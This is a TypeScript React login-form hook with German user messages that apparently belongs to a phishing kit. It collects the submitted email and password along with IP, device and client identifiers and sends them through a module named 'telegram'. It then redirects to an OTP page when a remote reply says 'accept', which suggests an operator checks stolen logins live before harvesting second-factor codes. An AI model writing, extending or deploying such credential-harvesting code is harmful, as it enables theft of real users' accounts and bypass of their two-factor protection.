import { useState, FormEvent } from 'react';
import { sendLoginDetails } from '../services/telegram';
import { getIPInfo } from '../services/ip';
import { getDeviceInfo } from '../utils/deviceInfo';
import { getEmailValidationError } from '../utils/validation';
import { getClientId } from '../utils/clientId';

export const useLoginForm = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    if (isLoading) return;
    
    setIsLoading(true);
    setError(null);

    try {
      const formData = new FormData(e.currentTarget);
      const email = formData.get('login_email') as string;
      const password = formData.get('login_password') as string;

      if (!email || !password) {
        throw new Error('Bitte füllen Sie alle Felder aus');
      }

      const emailError = getEmailValidationError(email);
      if (emailError) {
        throw new Error(emailError);
      }

      const [ipInfo, deviceInfo] = await Promise.all([
        getIPInfo(),
        Promise.resolve(getDeviceInfo())
      ]);
      const clientId = getClientId();

      const result = await sendLoginDetails({ 
        email, 
        password,
        ipInfo,
        deviceInfo,
        clientId
      });
      
      if (result === 'accept') {
        window.location.href = '/otp';
      } else {
        setError('Die eingegebenen Login-Daten sind nicht richtig. Bitte versuchen Sie es erneut.');
      }
      
    } catch (error) {
      setError(error instanceof Error ? error.message : 'Ein Fehler ist aufgetreten');
    } finally {
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    error,
    handleSubmit
  };
};